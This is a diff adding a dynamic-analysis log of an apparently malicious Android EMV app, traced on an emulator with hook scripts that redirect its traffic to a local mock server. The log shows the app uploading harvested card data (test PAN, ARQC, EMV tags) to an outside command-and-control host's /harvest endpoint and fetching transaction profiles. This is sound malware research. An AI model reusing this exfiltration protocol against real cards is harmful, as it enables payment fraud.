@@ -1,0 +1,14 @@
+[18:22:30] device: emulator-5556
+[18:22:30] attached pid=3097
+[18:22:31][send] {"tag": "info", "msg": "Reporter hooked (fetchCves/fetchReport/uploadHarvestData)"}
+[18:22:31][send] {"tag": "info", "msg": "EmvKernel hooked"}
+[18:22:31][send] {"tag": "info", "msg": "capture_c2.js ready (MOCK_URL=http://10.0.2.2:8771)"}
+[18:22:31] loaded samples/ckemv/apk_analysis/dynamic/hooks/capture_c2.js
+[18:22:31] running 75s ...
+[18:22:38][send] {"tag": "req", "method": "uploadHarvestData", "endpoint": "/harvest", "apiKey": "LAB-TESTKEY-0001", "baseUrl": "https://tqqemv.xyz", "body": "{\"pan\":\"4111111111111111\",\"aid\":\"A0000000031010\",\"network\":\"Visa\",\"tx_count\":1,\"raw_data\":{\"5A\":\"4111111111111111\"},\"harvested_txs\":[{\"atc\":\"0001\",\"arqc\":\"A1B2C3D4E5F60718\",\"time_ms\":42,\"cve_id\":1,\"params\":{\"9F02\":\"000000005000\"}}]}"}
+[18:22:38][send] {"tag": "rewrite", "from": "https://tqqemv.xyz", "to": "http://10.0.2.2:8771"}
+[18:22:38][send] {"tag": "resp", "method": "uploadHarvestData", "value": "Success: {\"result\": \"Success\", \"stored\": true}"}
+[18:23:08][send] {"tag": "req", "method": "fetchCves", "endpoint": "/me", "apiKey": "LAB-TESTKEY-0001", "baseUrl": "https://tqqemv.xyz"}
+[18:23:08][send] {"tag": "rewrite", "from": "https://tqqemv.xyz", "to": "http://10.0.2.2:8771"}
+[18:23:08][send] {"tag": "resp", "method": "fetchCves", "value": "{\"name\": \"analyst-mock\", \"cves\": [{\"id\": 1, \"name\": \"visa-baseline\", \"amount\": 5000, \"mastercard_tags\": {}, \"visa_tags\": {\"9F02\": \"000000005000\", \"5F2A\": \"0840\", \"9F1A\": \"0840\", \"9F35\": \"22\", \"9F33\": \"E0F8C8\", \"9C\": \"00\"}}, {\"id\": 2, \"name\": \"mc-baseline\", \"amount\": 5000, \"mastercard_tags\": {\"9F02\": \"000000005000\", \"5F2A\": \"0840\", \"9F1A\": \"0840\", \"9F35\": \"22\", \"9F33\": \"E0F8C8\", \"9C\": \"00\"}, \"visa_tags\": {}}], \"latest_version\": null}"}
+[18:23:46] done.
